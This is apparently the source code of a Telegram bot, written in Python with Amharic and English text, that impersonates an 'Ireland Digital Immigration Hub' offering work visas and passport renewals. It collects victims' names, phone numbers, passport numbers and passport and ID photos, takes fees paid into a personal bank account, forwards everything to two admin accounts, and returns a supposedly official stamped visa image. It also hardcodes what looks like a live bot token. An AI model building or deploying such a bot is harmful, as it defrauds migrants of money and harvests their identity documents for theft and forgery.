import os
from datetime import datetime
import threading
from flask import Flask
import telebot
from telebot import types

# --- 1. የቦት ቅንብሮች (NEW TOKEN, ADMINS & FEES) ---
BOT_TOKEN = "8220259287:AAEMPWSBB1rfpBkk7dZOoNCmGQFBmBHBiUs"
ADMIN_IDS = [7798767361, 7705713321]

VISA_FEE = "12,000 Birr"
RENEWAL_FEE = "10,000 Birr"

# 🏦 የባንክ መረጃ
BANK_INFO = "🏦 Commercial Bank of Ethiopia (CBE)\n🔢 Account: 1000744710042\n👤 Name: Samuel ademe"

bot = telebot.TeleBot(BOT_TOKEN)
flask_app = Flask(__name__)

@flask_app.route('/')
def index():
    return "🚀 Live CBE Bot - Photos & Language Change Active!"

# የተጠቃሚዎች ጊዜያዊ መረጃ መያዣ
user_sessions = {}

def get_session(chat_id):
    if chat_id not in user_sessions:
        user_sessions[chat_id] = {"lang": "en", "step": "START", "form": {}}
    return user_sessions[chat_id]

# --- 2. ቋሚ የተጠቃሚ ማውጫ ቁልፎች (Main Menu Buttons) ---
def get_main_keyboard(lang):
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    if lang == "am":
        markup.add("🔐 አዲስ የስራ ቪዛ ፎርም", "🛂 ቪዛ/ፓስፖርት ማደስ")
        markup.add("ℹ️ መረጃ (Info)", "🌐 ቋንቋ መቀየር (Language)")
    else:
        markup.add("🔐 New Work Visa Application", "🛂 Renew Visa / Passport")
        markup.add("ℹ️ Info", "🌐 Change Language")
    return markup

# ⬅️ ወደ ኋላ መመለሻ ቁልፍ መፍጠሪያ (Back Button Keyboard)
def get_back_keyboard(lang):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn = "⬅️ ተመለስ (Back)" if lang == "am" else "⬅️ Back"
    markup.add(btn)
    return markup

# --- 3. ቦቱ ሲጀመር መጀመሪያ የቋንቋ ምርጫ (/START) ---
@bot.message_handler(commands=['start'])
def start_command(message):
    chat_id = message.chat.id
    user_sessions[chat_id] = {"lang": "en", "step": "START", "form": {}}
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🇬🇧 English", callback_data="set_lang_en"),
        types.InlineKeyboardButton("🇪🇹 አማርኛ", callback_data="set_lang_am")
    )
    bot.send_message(chat_id, "Welcome to Ireland Digital Immigration Hub!\nእባክዎ መጀመሪያ የቦቱን ቋንቋ ይምረጡ / Please select the bot language first:", reply_markup=markup)

# --- 4. የቋንቋ እና የክፍያ ቁልፍ ክሊኮች ማስተናገጃ ---
@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    chat_id = call.message.chat.id
    session = get_session(chat_id)
    
    if call.data.startswith("set_lang_"):
        content_lang = "am" if call.data == "set_lang_am" else "en"
        session["lang"] = content_lang
        
        welcome_text = (
            "👋 እንኳን ወደ አየርላንድ ዲጂታል የኢሚግሬሽን መካነ-አውታር በደህና መጡ!\nከታች ያሉትን ቁልፎች በመጠቀም አገልግሎት ማግኘት ይችላሉ።" 
            if content_lang == "am" else 
            "👋 Welcome to the Ireland Digital Immigration Hub!\nYou can use the menu buttons below to access our automated services."
        )
        bot.send_message(chat_id, welcome_text, reply_markup=get_main_keyboard(content_lang))
        session["step"] = "MAIN_MENU"
        
    elif call.data == "proceed_cbe_payment":
        session["form"]["payment_method"] = "CBE Bank"
        session["step"] = "WAITING_SCREENSHOT"
        
        msg = (
            "እባክዎ ክፍያውን ፈጽመው የከፈሉበትን የሂሳብ ማረጋገጫ (Screenshot ፎቶ) እዚህ ላይ ይላኩ፦" 
            if session["lang"] == "am" else 
            "Please upload your payment receipt (Screenshot photo) here:"
        )
        bot.send_message(chat_id, msg, reply_markup=get_back_keyboard(session["lang"]))

# --- 5. የቦቱ ዋና የጥያቄዎች ፍሰት (Form Flow) ---
@bot.message_handler(func=lambda message: True, content_types=['text', 'photo'])
def bot_core_logic(message):
    chat_id = message.chat.id
    session = get_session(chat_id)
    lang = session["lang"]
    
    # ℹ️ Info ቁልፍ
    if message.text in ["ℹ️ Info", "ℹ️ መረጃ (Info)"]:
        info_txt = f"🇮🇪 **Ireland Portal Info desk**\n\n• Work Visa Fee: {VISA_FEE}\n• Passport Renewal Fee: {RENEWAL_FEE}\n• Gateway: CBE Bank Only\n• Status: Active"
        bot.send_message(chat_id, info_txt, parse_mode="Markdown")
        return
        
    # 🌐 Change Language ቁልፍ (የቋንቋ መቀየሪያ)
    elif message.text in ["🌐 Change Language", "🌐 ቋንቋ መቀየር (Language)"]:
        start_command(message)
        return

    # ==================== ⬅️ የ BACK BUTTON መቆጣጠሪያ ሎጂክ ====================
    if message.text and message.text in ["⬅️ Back", "⬅️ ተመለስ (Back)"]:
        current_step = session["step"]
        
        if current_step in ["VISA_Q1", "RENEW_NAME"]:
            session["step"] = "MAIN_MENU"
            bot.send_message(chat_id, "Returned to Main Menu" if lang == "en" else "ወደ ዋናው ማውጫ ተመልሰዋል", reply_markup=get_main_keyboard(lang))
            return
            
        elif current_step == "VISA_Q2":
            session["step"] = "VISA_Q1"
            markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
            markup.add("Yes", "No")
            markup.add("⬅️ ተመለስ (Back)" if lang == "am" else "⬅️ Back")
            bot.send_message(chat_id, "Question 1: Do you possess an accredited Degree or Diploma?\n(ጥያቄ 1፦ የዩኒቨርሲቲ ዲግሪ ወይም ዲፕሎማ አለዎት?)", reply_markup=markup)
            return
            
        elif current_step == "VISA_NAME":
            session["step"] = "VISA_Q2"
            markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
            markup.add("1-3 Years", "3+ Years", "No Experience")
            markup.add("⬅️ ተመለስ (Back)" if lang == "am" else "⬅️ Back")
            bot.send_message(chat_id, "Question 2: Select your career experience timeframe / የስራ ልምድዎን ይምረጡ፦", reply_markup=markup)
            return
            
        elif current_step == "VISA_PHONE":
            session["step"] = "VISA_NAME"
            bot.send_message(chat_id, "Enter your Full Name / ሙሉ ስምዎን ያስገቡ፦", reply_markup=get_back_keyboard(lang))
            return
            
        elif current_step == "VISA_PASSPORT":
            session["step"] = "VISA_PHONE"
            bot.send_message(chat_id, "Enter your Phone Number / የስልክ ቁጥርዎን ያስገቡ፦", reply_markup=get_back_keyboard(lang))
            return
            
        elif current_step == "VISA_PHOTO":
            session["step"] = "VISA_PASSPORT"
            bot.send_message(chat_id, "Enter your Passport Number / የፓስፖርት ቁጥርዎን ያስገቡ፦", reply_markup=get_back_keyboard(lang))
            return

        elif current_step == "VISA_ID_PHOTO":
            session["step"] = "VISA_PHOTO"
            bot.send_message(chat_id, "Please send a photo scan of your Passport / እባክዎ የፓስፖርትዎን ፎቶ ኮፒ ይላኩ፦", reply_markup=get_back_keyboard(lang))
            return
            
        elif current_step == "RENEW_PHONE":
            session["step"] = "RENEW_NAME"
            bot.send_message(chat_id, "ሙሉ ስምዎን ያስገቡ / Enter your Full Name:", reply_markup=get_back_keyboard(lang))
            return
            
        elif current_step == "RENEW_PASSPORT":
            session["step"] = "RENEW_PHONE"
            bot.send_message(chat_id, "የስልክ ቁጥርዎን ያስገቡ / Enter your Phone Number:", reply_markup=get_back_keyboard(lang))
            return
            
        elif current_step == "RENEW_PHOTO":
            session["step"] = "RENEW_PASSPORT"
            bot.send_message(chat_id, "የድሮ ፓስፖርት ቁጥርዎን ያስገቡ / Enter Expired Passport Number:", reply_markup=get_back_keyboard(lang))
            return

        elif current_step == "RENEW_ID_PHOTO":
            session["step"] = "RENEW_PHOTO"
            bot.send_message(chat_id, "እባክዎ አዲስ የፓስፖርት መጠን ፎቶ ይላኩ፦", reply_markup=get_back_keyboard(lang))
            return
            
        elif current_step == "WAITING_SCREENSHOT":
            if session["form"].get("service_type") == "Work Visa Application":
                session["step"] = "VISA_ID_PHOTO"
                bot.send_message(chat_id, "Please send a photo of your ID Card / እባክዎ የማንነት መታወቂያዎን (ID) ፎቶ ይላኩ፦", reply_markup=get_back_keyboard(lang))
            else:
                session["step"] = "RENEW_ID_PHOTO"
                bot.send_message(chat_id, "እባክዎ የማንነት መታወቂያዎን (ID) ፎቶ ይላኩ፦", reply_markup=get_back_keyboard(lang))
            return
    # ======================================================================

    # 🔐 አዲስ የስራ ቪዛ ፎርም ማስጀመሪያ
    elif message.text in ["🔐 New Work Visa Application", "🔐 አዲስ የስራ ቪዛ ፎርም"]:
        session["step"] = "VISA_Q1"
        session["form"] = {"chat_id": chat_id, "service_type": "Work Visa Application", "fee_charged": VISA_FEE, "date": datetime.now().strftime("%d/%m/%Y %H:%M")}
        markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        markup.add("Yes", "No")
        markup.add("⬅️ ተመለስ (Back)" if lang == "am" else "⬅️ Back")
        bot.send_message(chat_id, "Question 1: Do you possess an accredited Degree or Diploma?\n(ጥያቄ 1፦ የዩኒቨርሲቲ ዲግሪ ወይም ዲፕሎማ አለዎት?)", reply_markup=markup)
        return

    # 🛂 ቪዛ/ፓስፖርት ማደስ ማስጀመሪያ
    elif message.text in ["🛂 Renew Visa / Passport", "🛂 ቪዛ/ፓስፖርት ማደስ"]:
        session["step"] = "RENEW_NAME"
        session["form"] = {"chat_id": chat_id, "service_type": "Visa/Passport Renewal", "fee_charged": RENEWAL_FEE, "date": datetime.now().strftime("%d/%m/%Y %H:%M")}
        bot.send_message(chat_id, "ሙሉ ስምዎን ያስገቡ / Enter your Full Name:", reply_markup=get_back_keyboard(lang))
        return

    step = session["step"]

    # ====== 📋 የስራ ቪዛ ጥያቄዎች ፍሰት ======
    if step == "VISA_Q1":
        session["form"]["has_degree"] = message.text
        session["step"] = "VISA_Q2"
        markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        markup.add("1-3 Years", "3+ Years", "No Experience")
        markup.add("⬅️ ተመለስ (Back)" if lang == "am" else "⬅️ Back")
        bot.send_message(chat_id, "Question 2: Select your career experience timeframe / የስራ ልምድዎን ይምረጡ፦", reply_markup=markup)
    
    elif step == "VISA_Q2":
        session["form"]["experience"] = message.text
        session["step"] = "VISA_NAME"
        bot.send_message(chat_id, "Enter your Full Name / ሙሉ ስምዎን ያስገቡ፦", reply_markup=get_back_keyboard(lang))
        
    elif step == "VISA_NAME":
        session["form"]["fullname"] = message.text
        session["step"] = "VISA_PHONE"
        bot.send_message(chat_id, "Enter your Phone Number / የስልክ ቁጥርዎን ያስገቡ፦", reply_markup=get_back_keyboard(lang))
        
    elif step == "VISA_PHONE":
        session["form"]["phone"] = message.text
        session["step"] = "VISA_PASSPORT"
        bot.send_message(chat_id, "Enter your Passport Number / የፓስፖርት ቁጥርዎን ያስገቡ፦", reply_markup=get_back_keyboard(lang))
        
    elif step == "VISA_PASSPORT":
        session["form"]["passport"] = message.text.strip().upper()
        session["step"] = "VISA_PHOTO"
        bot.send_message(chat_id, "Please send a photo scan of your Passport / እባክዎ የፓስፖርትዎን ፎቶ ኮፒ ይላኩ፦", reply_markup=get_back_keyboard(lang))
        
    elif step == "VISA_PHOTO":
        if message.content_type != 'photo':
            bot.send_message(chat_id, "⚠️ Please upload a valid photo scan.")
            return
        session["form"]["user_photo_id"] = message.photo[-1].file_id
        session["step"] = "VISA_ID_PHOTO"
        bot.send_message(chat_id, "Please send a photo of your ID Card / እባክዎ የማንነት መታወቂያዎን (ID) ፎቶ ይላኩ፦", reply_markup=get_back_keyboard(lang))

    elif step == "VISA_ID_PHOTO":
        if message.content_type != 'photo':
            bot.send_message(chat_id, "⚠️ Please upload a valid ID card photo.")
            return
        session["form"]["user_id_photo_id"] = message.photo[-1].file_id
        ask_payment_choice(chat_id, lang, VISA_FEE)

    # ====== 🛂 የማደሻ ፎርም (Renewal) ጥያቄዎች ፍሰት ======
    elif step == "RENEW_NAME":
        session["form"]["fullname"] = message.text
        session["step"] = "RENEW_PHONE"
        bot.send_message(chat_id, "የስልክ ቁጥርዎን ያስገቡ / Enter your Phone Number:", reply_markup=get_back_keyboard(lang))
    elif step == "RENEW_PHONE":
        session["form"]["phone"] = message.text
        session["step"] = "RENEW_PASSPORT"
        bot.send_message(chat_id, "የድሮ ፓስፖርት ቁጥርዎን ያስገቡ / Enter Expired Passport Number:", reply_markup=get_back_keyboard(lang))
    elif step == "RENEW_PASSPORT":
        session["form"]["passport"] = message.text.strip().upper()
        session["step"] = "RENEW_PHOTO"
        bot.send_message(chat_id, "እባክዎ አዲስ የፓስፖርት መጠን ፎቶ ይላኩ፦", reply_markup=get_back_keyboard(lang))
    elif step == "RENEW_PHOTO":
        if message.content_type != 'photo':
            bot.send_message(chat_id, "⚠️ Please upload a photo.")
            return
        session["form"]["user_photo_id"] = message.photo[-1].file_id
        session["step"] = "RENEW_ID_PHOTO"
        bot.send_message(chat_id, "እባክዎ የማንነት መታወቂያዎን (ID) ፎቶ ይላኩ፦", reply_markup=get_back_keyboard(lang))
    elif step == "RENEW_ID_PHOTO":
        if message.content_type != 'photo':
            bot.send_message(chat_id, "⚠️ Please upload an ID photo.")
            return
        session["form"]["user_id_photo_id"] = message.photo[-1].file_id
        ask_payment_choice(chat_id, lang, RENEWAL_FEE)

    # ====== 📸 የክፍያ ማረጋገጫ ስክሪንሾት እና ለአድሚኖች ማስተላለፊያ ======
    elif step == "WAITING_SCREENSHOT":
        if message.content_type != 'photo':
            bot.send_message(chat_id, "⚠️ Please send a payment receipt screenshot!")
            return
        
        screenshot_file_id = message.photo[-1].file_id
        bot.send_message(chat_id, "Your request is being processed.", reply_markup=get_main_keyboard(lang))
        
        admin_report = (
            f"🔔 **NEW REGISTRATION SUBMITTED**\n\n"
            f"👤 Name: {session['form'].get('fullname')}\n"
            f"🛂 Passport: {session['form'].get('passport')}\n"
            f"📱 Phone: {session['form'].get('phone')}\n"
            f"🎓 Degree?: {session['form'].get('has_degree', 'N/A')}\n"
            f"💼 Exp: {session['form'].get('experience', 'N/A')}\n"
            f"✨ Service: {session['form']['service_type']}\n"
            f"💰 Price: {session['form']['fee_charged']}\n"
            f"💳 Gateway: CBE Bank Only\n"
            f"🆔 User Chat ID: `{chat_id}`"
        )
        
        for admin_id in ADMIN_IDS:
            try:
                # መረጃዎችን እና የክፍያ ማረጋገጫ መላክ
                bot.send_message(admin_id, admin_report, parse_mode="Markdown")
                bot.send_photo(admin_id, screenshot_file_id, caption=f"User Payment Screenshot\n\nTo accept click: /approve_{chat_id}\nTo send photo click: /sendphoto_{chat_id}")
                
                # ፓስፖርት እና ID ፎቶዎችን ለአድሚን ለይቶ ማስተላለፍ
                if "user_photo_id" in session["form"]:
                    bot.send_photo(admin_id, session["form"]["user_photo_id"], caption="📄 User Passport Photo Scan")
                if "user_id_photo_id" in session["form"]:
                    bot.send_photo(admin_id, session["form"]["user_id_photo_id"], caption="🪪 User ID Card Photo")
            except Exception as e:
                print(f"Error sending to admin {admin_id}: {e}")
        
        session["step"] = "MAIN_MENU"

# 💳 የባንክ መረጃ ማሳያ
def ask_payment_choice(chat_id, lang, fee):
    markup = types.InlineKeyboardMarkup()
    btn_text = "📸 Upload Screenshot / ስክሪንሾት ለመላክ"
    markup.add(types.InlineKeyboardButton(btn_text, callback_data="proceed_cbe_payment"))
    
    if lang == "am":
        msg = (
            f"💳 **የክፍያ ማረጋገጫ መረጃ**\n\n"
            f"{BANK_INFO}\n\n"
            f"💰 **የአገልግሎት ክፍያ ሂሳብ፦ {fee}**\n\n"
            f"እባክዎ ከላይ በተጠቀሰው የባንክ አካውንት ክፍያውን ፈጽመው ሲያበቁ የክፍያ ማረጋገጫ ስክሪንሾት ለመላክ ከታች ያለውን ቁልፍ ይጫኑ።"
        )
    else:
        msg = (
            f"💳 **Payment Instructions**\n\n"
            f"{BANK_INFO}\n\n"
            f"💰 **Total Required Fee: {fee}**\n\n"
            f"Please complete the bank transfer. Once paid, click the button below to upload your receipt screenshot."
        )
    bot.send_message(chat_id, msg, reply_markup=markup, parse_mode="Markdown")


# ====== 🔒 6. የአድሚን መቆጣጠሪያ ትዕዛዞች ======

@bot.message_handler(func=lambda m: m.chat.id in ADMIN_IDS and m.text.startswith('/approve_'))
def admin_approve_submission(message):
    target_chat_id = int(message.text.replace('/approve_', '').strip())
    user_name = user_sessions.get(target_chat_id, {}).get('form', {}).get('fullname', 'User')
    approval_text = f"dear {user_name} ,your request accepted and your form is in progress waiti some hours"
    
    try:
        bot.send_message(target_chat_id, approval_text)
        bot.send_message(message.chat.id, f"✅ User {user_name} has been notified successfully!")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Failed to notify user: {e}")

@bot.message_handler(func=lambda m: m.chat.id in ADMIN_IDS and m.text.startswith('/sendphoto_'))
def admin_start_photo_send(message):
    target_chat_id = int(message.text.replace('/sendphoto_', '').strip())
    msg = bot.send_message(message.chat.id, "Please upload the Stamped Official Photo/Visa now:")
    bot.register_next_step_handler(msg, admin_forward_photo_to_user, target_chat_id)

def admin_forward_photo_to_user(message, target_chat_id):
    if message.content_type != 'photo':
        bot.send_message(message.chat.id, "❌ Cancelled. Must be a photo.")
        return
        
    try:
        bot.send_message(target_chat_id, "📥 Official Verified Stamped Visa/Photo from Admin:")
        bot.send_photo(target_chat_id, message.photo[-1].file_id, caption="Official Approved Ireland Document")
        bot.send_message(message.chat.id, "🎯 Stamped photo successfully forwarded to the user!")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error sending photo: {e}")

def run_web_server():
    flask_app.run(host="0.0.0.0", port=7860)

if __name__ == '__main__':
    threading.Thread(target=run_web_server, daemon=True).start()
    print("🤖 Bot is active with new Token and Passport/ID photo validation!")
    bot.infinity_polling()
